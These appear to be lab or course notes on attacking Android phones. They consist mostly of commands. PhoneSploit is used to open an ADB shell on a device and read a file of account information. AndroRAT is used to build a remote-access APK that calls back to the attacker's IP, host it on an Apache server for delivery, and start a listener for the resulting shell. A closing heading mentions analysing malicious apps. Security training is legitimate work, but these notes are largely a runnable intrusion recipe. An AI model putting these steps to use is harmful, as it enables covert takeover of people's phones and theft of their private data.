# Hacking Mobile Platforms

## PhoneSploit

**Exploit the Android Platform through ADB using PhoneSploit**

```bash
python3 -m pip install colorama

python3 phonesploit.py
```

by option 3 enter ip of the device  and when ever asked for device name enter same ip

Example

apt-get install adb
git clone [github.com/01010000/phonesploit](http://github.com/01010000/phonesploit)
cd phonesploit
pyhton3 [phonesploit.py](http://phonesploit.py/)
3 (Connect to new phone)
Add IP address of android device
4 (Access shell on phone)
IP address again of android device
pwd
ls
cd sdcard
ls
cd downloads
cat accnt-info.txt

## AndroRAT

**Hack an Android Device by Creating APK File using AndroRAT**

```bash
python3 androRAT.py --build -i <attacker's IP> -p <port> -o <outputfile.apk>
```

for delivering apk to remote mobile device

```bash
mkdir /var/www/html/share
chmod -755 /var/www/html/share
chown -R 755 /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share

cp filepath/outputfile.apk /var/www/html/share

service apache2 start
```

for responder

```bash
python3 androRAT.py --shell -i 0.0.0.0 -p <port>
```

## Sixo Online APK Analyzer

**Analyze a Malicious App using Online Android Analyzers**